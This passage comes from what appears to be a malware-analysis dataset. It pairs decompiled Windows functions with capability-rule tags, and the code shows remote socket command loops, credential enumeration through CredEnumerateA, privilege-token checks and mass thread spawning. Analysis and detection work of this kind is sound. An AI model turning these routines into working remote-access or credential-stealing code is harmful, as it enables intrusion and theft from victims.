(****0x49894c)();\n    if (iVar4 >> 0x20 == 0) {\n        if (iVar4 == 0) goto code_r0x0047eb2a;\n    }\n    else if (iVar4 < 0x100000000) goto code_r0x0047eb2a;\n    fcn.0047f870();\ncode_r0x0047eb2a:\n    *in_FS_OFFSET = uVar5;\n    return;\n}\n",
        "token_count": 760
    },
    "0047f68c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047f68c noreturn (void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0x47f697;\n    cVar1 = fcn.0047ecf0();\n    if (cVar1 == '\\0') {\n    // WARNING: Subroutine does not return\n        uStack20 = 0x47f6a0;\n        fcn.0047ee80();\n    }\n    uStack20 = 0x47f6ac;\n    *0x49894c = fcn.00404610();\n    uStack20 = 0x47f6bd;\n    *0x498950 = fcn.00404610();\n    uStack20 = 0x47f6ce;\n    *0x498954 = fcn.00404610();\n    uStack20 = 0x47f6df;\n    *0x498958 = fcn.00428b88();\n    uStack20 = 0x47f6f0;\n    *0x49895c = fcn.00428b88();\n    uStack20 = 0x47f701;\n    *0x498960 = fcn.00428b88();\n    *0x498964 = 0;\n    bVar5 = true;\n    *0x498968 = 0;\n    uStack20 = 0x47f725;\n    fcn.00405894();\n    if (bVar5) {\n        uStack20 = 0x47f72e;\n        fcn.0047e710();\n    }\n    else {\n        uStack20 = 0x47f741;\n        fcn.00405894();\n        if (bVar5) {\n            uStack20 = 0x47f74a;\n            fcn.0047e710();\n        }\n        else {\n            uStack20 = 0x47f75d;\n            fcn.00405894();\n            if (bVar5) {\n                uStack20 = 0x47f766;\n                fcn.0047e710();\n            }\n            else {\n                uStack20 = 0x47f779;\n                fcn.00405894();\n                if (bVar5) {\n                    uStack20 = 0x47f782;\n                    fcn.0047e710();\n                }\n                else {\n                    uStack20 = 0x47f78b;\n                    fcn.0047e710();\n                }\n            }\n        }\n    }\n    uStack20 = 0;\n    uStack24 = 0x47f792;\n    iVar2 = sub.user32.dll_GetSystemMetrics();\n    uStack24 = 1;\n    puStack28 = 0x47f79b;\n    iVar3 = sub.user32.dll_GetSystemMetrics();\n    puStack28 = 0x47f7a9;\n    iVar4 = fcn.00409e54();\n    *0x49896c = (iVar4 * iVar2) / 100;\n    puStack28 = 0x47f7c4;\n    iVar2 = fcn.00409e54();\n    *0x498970 = (iVar2 * iVar3) / 100;\n    puStack28 = 0x47f7df;\n    *0x498990 = fcn.0042e264();\n    while (**0x492a4c != '\\0') {\n        uStack32 = 0x47f81a;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        cVar1 = fcn.0047e780();\n        if (cVar1 == '\\0') {\n            fcn.0047e994();\n        }\n        else {\n            fcn.0047e870();\n        }\n        sub.kernel32.dll_Sleep_1();\n        *in_FS_OFFSET = 0x1e;\n    }\n    // WARNING: Subroutine does not return\n    puStack28 = 0x47f838;\n    fcn.0047ee80();\n}\n",
        "token_count": 951
    },
    "00481514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00481514 noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack44 = 0x481533;\n    fcn.00405f08();\n    uStack48 = 0x48160e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x4815d9;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    iVar1 = *(arg_8h + 4);\n    if (iVar1 <= *(arg_8h + 8)) {\n        iVar2 = (*(arg_8h + 8) - iVar1) + 1;\n        var_14h = iVar1;\n        do {\n            if (**0x49285c == '\\0') {\n    // WARNING: Subroutine does not return\n                sub.kernel32.dll_ExitThread(0);\n            }\n            iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n            fcn.004054c0();\n            *(iVar1 + 4) = var_14h;\n            sub.kernel32.dll_CreateThread(0, 0, fcn.0048134c, iVar1, 0, &fcn.00481514::var_18h);\n            uStack64 = 100;\n            sub.kernel32.dll_Sleep_1();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 507
    },
    "004816f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004816f4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48175d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (*0x49bb74 == 0) {\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        fcn.00470314();\n        fcn.00404640();\n        fcn.004707cc();\n        fcn.00404640();\n        *0x49bb78 = 0;\n        *0x49bb74 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00481a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00481a04 noreturn (void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint16_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_12h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x481bea;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    puVar2 = &stack0xfffffffc;\n    if (*0x49bb7c != 0) {\n        fcn.00404640();\n        *0x49bb7c = 0;\n        puVar2 = puStack40;\n    }\n    puStack40 = puVar2;\n    *0x49bb7c = fcn.00404610();\n    fcn.004816f4();\n    fcn.00481774();\n    iVar5 = fcn.00409e54();\n    uVar3 = fcn.00409e54();\n    uVar4 = fcn.00409e54();\n    if (*0x49bb74 == 0) {\n        *0x49bb74 = fcn.004700c0();\n    }\n    if (*0x49bb78 == 0) {\n        *0x49bb78 = fcn.00470554();\n    }\n    iVar1 = *0x49bb78;\n    *(*0x49bb78 + 0xa4) = *0x49bb7c;\n    *(iVar1 + 0xa0) = fcn.0048190c;\n    *(*0x49bb74 + 0x15e) = uVar3;\n    *(*0x49bb74 + 0x160) = iVar5;\n    *(*0x49bb74 + 0x164) = uVar3 * iVar5 * 2;\n    *(*0x49bb74 + 0x168) = uVar3 * 2;\n    *(*0x49bb74 + 0x16a) = uVar4;\n    fcn.00470330();\n    fcn.00470824();\n    fcn.00470314();\n    fcn.004706ec();\n    do {\n        fcn.00445a50();\n    } while (**0x4927dc != '\\0');\n    fcn.00470314();\n    fcn.004707cc();\n    fcn.00404640();\n    fcn.00404640();\n    fcn.00404640();\n    *0x49bb78 = 0;\n    *0x49bb74 = 0;\n    *0x49bb7c = 0;\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 631
    },
    "00481dd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00481dd8(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_24h = &stack0xfffffffc;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x482077;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00481dd8::var_20h;\n    if (*0x492568 != '\\x01') {\n        var_28h = 0x48202b;\n        var_2ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00481dd8::var_2ch;\n        var_18h = &stack0xfffffffc;\n        var_14h = unaff_EDI;\n        var_10h = unaff_ESI;\n        fcn.0040546c();\n        *0x492568 = 1;\n        *0x492564 = '\\0';\n        fcn.0046f264();\n        fcn.0040eeb8(&fcn.00481dd8::var_24h, *0x482088);\n        fcn.00405504();\n        fcn.00409af4();\n        fcn.00405504();\n        piVar1 = fcn.00404610();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            (**(*piVar1 + 0x48))();\n            fcn.00405a48(&fcn.00481dd8::var_10h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48(&fcn.00481dd8::var_14h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405a48(&fcn.00481dd8::var_18h);\n            fcn.00405964();\n            fcn.00405a48();\n            fcn.004059a4();\n            fcn.00405504();\n            iVar2 = 0;\n            do {\n                uVar9 = 0x4820a8;\n                uVar7 = 0x4820a8;\n                uVar5 = 0x4820a8;\n                uVar4 = 0;\n                iVar3 = iVar2;\n                puVar6 = var_18h;\n                uVar8 = var_14h;\n                uVar10 = var_10h;\n                fcn.00409dd4(iVar2);\n                fcn.00405800(var_2ch, iVar3, uVar4, uVar5, puVar6, uVar7, uVar8, uVar9, uVar10);\n                sub.kernel32.dll_CreateThread(0, 0, fcn.00481c60, &fcn.00481dd8::var_4h, 0, &fcn.00481dd8::var_20h);\n                sub.kernel32.dll_Sleep_1();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0x100);\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n        uVar8 = 0x4820b4;\n        fcn.00405800(0x4820b4, var_18h, 0x4820a8, var_14h, 0x4820a8, var_10h);\n        while (*0x492564 == '\\0') {\n            uVar8 = 100;\n            sub.kernel32.dll_Sleep_1();\n        }\n        fcn.00405784();\n        fcn.00472b58();\n        *in_FS_OFFSET = uVar8;\n        *in_FS_OFFSET = var_14h;\n        fcn.00405490(0x48207e);\n        fcn.00405490();\n        return;\n    }\n    var_24h = NULL;\n    // WARNING: Subroutine does not return\n    var_28h = 0x48204f;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1189
    },
    "00482d30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482d30 noreturn (uint arg_8h)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint auStackY8260 [780];\n    uint uStackY5140;\n    uchar *puStackY5132;\n    uint uStackY5128;\n    uint uStackY5124;\n    int32_t iStackY5120;\n    uchar *puStackY5116;\n    int32_t iStackY5112;\n    int32_t iStackY5108;\n    uint uVar6;\n    uint uStack4968;\n    uint uStack4964;\n    uchar *puStack4960;\n    uint uStack4956;\n    uint uStack4952;\n    uchar *puStack4948;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4960 = &stack0xfffffffc;\n    iVar2 = 3;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    puStack4948 = 0x482d83;\n    fcn.00405f08();\n    uStack4952 = 0x48312e;\n    uStack4956 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffeca4;\n    uStack4964 = 0x4830c0;\n    uStack4968 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffec98;\n    puStack4948 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    iVar2 = sub.wsock32.dll_WSAStartup();\n    if (iVar2 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    iVar2 = sub.wsock32.dll_socket();\n    if (iVar2 == -1) {\n        sub.wsock32.dll_WSACleanup();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    fcn.00489450();\n    sub.wsock32.dll_inet_addr();\n    sub.wsock32.dll_connect();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.00405800();\n    fcn.00472bec();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffec24;\n    iVar1 = fcn.00488f70();\n    *in_FS_OFFSET = uVar6;\n    if (iVar1 <= *0x483164) {\n        fcn.0040390c();\n        fcn.0040304c();\n        sub.wsock32.dll_closesocket();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    var_40h = SUB104(iVar1, 0);\n    fcn.0040b6c4(var_40h);\n    fcn.00405784();\n    fcn.00472bec();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.00403aac();\n    puVar4 = 0x483178;\n    puVar5 = &stack0xffffdfbc;\n    for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    fcn.00403764();\n    **0x4929d8 = 0;\n    fcn.00403e20();\n    do {\n        iStackY5108 = 0x48304b;\n        fcn.004038cc(&fcn.00482d30::var_30h);\n        if (var_30h < 1) break;\n        iStackY5108 = 0;\n        iStackY5112 = var_30h;\n        puStackY5116 = &stack0xffffdfbc;\n        uStackY5124 = 0x483067;\n        iStackY5120 = iVar2;\n        sub.wsock32.dll_send();\n        uStackY5124 = 0x483079;\n        fcn.00403aac();\n        uStackY5124 = 0;\n        uStackY5128 = 0x2000;\n        puStackY5132 = &stack0xffffdfbc;\n        uStackY5140 = 0x483090;\n        sub.wsock32.dll_recv();\n    } while (var_30h != 0);\n    iStackY5108 = 0x4830a1;\n    fcn.0040390c();\n    iStackY5108 = 0x4830a6;\n    fcn.0040304c();\n    iStackY5112 = 0x4830af;\n    iStackY5108 = iVar2;\n    sub.wsock32.dll_closesocket();\n    iStackY5112 = 0;\n    // WARNING: Subroutine does not return\n    puStackY5116 = 0x4830b6;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 1324
    },
    "00487cec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487cec(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *in_FS_OFFSET;\n    uchar uVar5;\n    int32_t iStackY12784;\n    uint uStackY12780;\n    uint uStackY12776;\n    uint uStackY12772;\n    uint uStackY12768;\n    ushort uStackY12764;\n    ushort uStackY12762;\n    uint uStackY12760;\n    uint uStackY4768;\n    uchar *puVar6;\n    int32_t iVar7;\n    int32_t iStack4628;\n    uint uStack4624;\n    uchar *puStack4620;\n    int32_t iStack4616;\n    uint uStack4612;\n    uchar *puStack4608;\n    uint var_1038h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4620 = &stack0xfffffffc;\n    iVar1 = 3;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    iStackY12784 = 0;\n    uStackY12780 = 0;\n    uStackY12772 = 0;\n    uStackY12776 = 0;\n    uStackY12768 = 0;\n    puStack4608 = 0x487d48;\n    fcn.00405f08();\n    uStack4612 = 0x4881d1;\n    iStack4616 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffedf8;\n    uStack4624 = 0x48813d;\n    iStack4628 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffedec;\n    puStack4608 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    iVar1 = sub.wsock32.dll_WSAStartup();\n    if (iVar1 != 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    puVar2 = sub.wsock32.dll_socket();\n    if (puVar2 == 0xffffffff) {\n        sub.wsock32.dll_WSACleanup();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    uStackY12764 = 2;\n    uStackY12762 = sub.wsock32.dll_htons();\n    fcn.00489450();\n    uStackY12760 = sub.wsock32.dll_inet_addr();\n    sub.wsock32.dll_connect();\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.00405800();\n    fcn.00472bec();\n    iVar7 = 0;\n    puVar6 = puVar2;\n    sub.wsock32.dll_recv();\n    fcn.00403aac();\n    fcn.00404610();\n    fcn.00409e54();\n    fcn.004682b8();\n    piVar3 = fcn.00428b88();\n    fcn.0042a0dc();\n    fcn.00404610();\n    piVar4 = fcn.00404610();\n    iVar1 = **0x492aa4;\n    do {\n        if (iVar1 != 1) {\n            *in_FS_OFFSET = puVar6;\n            *in_FS_OFFSET = iVar7;\n            fcn.00405490();\n            fcn.00405c60();\n            fcn.0040546c();\n            fcn.00405fcc();\n            fcn.00405490();\n            return;\n        }\n        iVar1 = sub.wsock32.dll_recv();\n        if (iVar1 < 1) {\n            **0x492aa4 = 0;\n            fcn.00468398();\n            fcn.00404640();\n            fcn.00404640();\n            fcn.00404640();\n            sub.wsock32.dll_closesocket();\n            fcn.00472b58();\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread();\n        }\n        fcn.00405d5c();\n        fcn.00409b48();\n        fcn.004056f4();\n        uVar5 = 1;\n        fcn.00403aac();\n        fcn.00405964();\n        fcn.00405894();\n        if (uVar5) {\n            **0x492aa4 = 0;\n            fcn.00468398();\n            fcn.00404640();\n            fcn.00404640();\n            fcn.00404640();\n            sub.wsock32.dll_closesocket();\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread();\n        }\n        puVar6 = &stack0xffffce10;\n        fcn.00405964();\n        if (iStackY12784 != 0) {\n            uStackY4768 = 0x48804d;\n            fcn.0041b674(0, 0);\n            uStackY4768 = 0x488052;\n            fcn.004683cc();\n            uStackY4768 = 0x48805c;\n            fcn.00429d70();\n            uStackY4768 = 0x48806d;\n            fcn.0042a0dc();\n            uStackY4768 = 0x488078;\n            (**(*piVar3 + 0x58))();\n            iVar7 = 0;\n            fcn.0041b674(0, 0);\n            fcn.00469ce4();\n            puVar6 = NULL;\n            fcn.0041b674(0, 0);\n            do {\n                iVar1 = (**(*piVar4 + 0xc))();\n                if (iVar1 == 0) break;\n                sub.wsock32.dll_send();\n                fcn.00403aac();\n                uStackY4768 = 0x4880f2;\n                puVar6 = puVar2;\n                sub.wsock32.dll_recv();\n                uStackY4768 = 0x488104;\n                fcn.00403aac();\n            } while (iVar1 != 0);\n            fcn.00472bec();\n            fcn.0041bd84();\n            fcn.0041bd84();\n        }\n        iVar1 = **0x492aa4;\n    } while( true );\n}\n",
        "token_count": 1490
    },
    "00489c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00489c6c(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_ch = 0;\n    uStack48 = 0x489d42;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_8h = in_EAX;\n    fcn.0040546c();\n    uVar2 = 0x489d50;\n    sub.advapi32.dll_CredEnumerateA(0x489d50, 0, &var_ch, &var_4h);\n    for (iVar1 = var_ch; iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.00405664(0x489d6c, *var_8h);\n        fcn.00489b5c(0x489d7c, 0);\n        fcn.004058fc();\n        fcn.00405664();\n        uVar2 = 0x489d94;\n        fcn.00405800();\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x489d49);\n    fcn.00406a20();\n    return;\n}\n",
        "token_count": 366
    },
    "0048a288": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a288(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffcc;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48a2a0;\n    fcn.004058ec();\n    puStack28 = 0x48a2a8;\n    fcn.004058ec();\n    uStack32 = 0x48a313;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc();\n    iVar2 = sub.kernel32.dll_LoadLibraryA(uVar1);\n    if ((iVar2 != 0) && (iVar2 = sub.kernel32.dll_GetModuleHandleA_2(uVar1),  iVar2 != 0)) {\n        uVar1 = fcn.004058fc();\n        uVar1 = sub.kernel32.dll_GetProcAddress_1(iVar2, uVar1);\n        *param_1 = uVar1;\n        in_stack_ffffffcc = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.00405490(0x48a31a);\n    return;\n}\n",
        "token_count": 333
    },
    "0048af60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048b0ce)\n\nvoid fcn.0048af60(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint ReturnLength;\n    int32_t var_14h;\n    int32_t TokenInformation;\n    uint TokenHandle;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x48b10b;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48b0a6;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = &fcn.0048af60::TokenHandle;\n    uStack76 = 8;\n    uStack80 = 0x48af9b;\n    uStack80 = sub.kernel32.dll_GetCurrentProcess();\n    puStack84 = 0x48afa1;\n    iVar1 = sub.advapi32.dll_OpenProcessToken();\n    if (iVar1 == 0) {\n        puStack84 = 0x48b09c;\n        fcn.004054c0();\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x48b0c8;\n        fcn.00409af4();\n        *in_FS_OFFSET = puStack84;\n        uStack76 = 0x48b112;\n        uStack80 = 0x48b102;\n        fcn.0040546c();\n        uStack80 = 0x48b10a;\n        fcn.0040546c();\n        return;\n    }\n    uStack88 = 0x48b088;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x12, &fcn.0048af60::TokenInformation, 4, &fcn.0048af60::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.004054c0();\n    }\n    else if (TokenInformation == 1) {\n        fcn.00405504();\n    }\n    else if (TokenInformation == 2) {\n        fcn.00405504();\n    }\n    else if (TokenInformation == 3) {\n        fcn.00405504();\n    }\n    else {\n        fcn.00405504();\n    }\n    uVar2 = TokenHandle;\n    iVar1 = sub.advapi32.dll_GetTokenInformation\n                      (TokenHandle, 0x14, &fcn.0048af60::var_14h, 4, &fcn.0048af60::ReturnLength);\n    if (iVar1 == 0) {\n        fcn.004054c0();\n    }\n    else if (var_14h == 0) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = uVar2;\n    sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48b09c);\n    return;\n}\n",
        "token_count": 828
    },
    "0048ba34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048ba34(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    int64_t iVar3;\n    uint arg_8h;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    double dStack12;\n    \n    puStack48 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack52 = 0x48bb03;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    dStack12 = param_1;\n    iVar1 = -1;\n    do {\n        dStack12 = dStack12 / *0x48bb14;\n        iVar1 = iVar1 + 1;\n        iVar3 = fcn.00403450();\n        if (iVar3 == 0) {\n            dStack12 = dStack12 * *0x48bb14;\n            break;\n        }\n    } while (iVar1 < 4);\n    fVar2 = dStack12;\n    arg_8h = SUB104(fVar2, 0);\n    fcn.00403414(arg_8h, fVar2 >> 0x20, fVar2 >> 0x40, &var_ch);\n    _var_20h = dStack12;\n    var_14h = &var_20h;\n    var_10h._0_1_ = 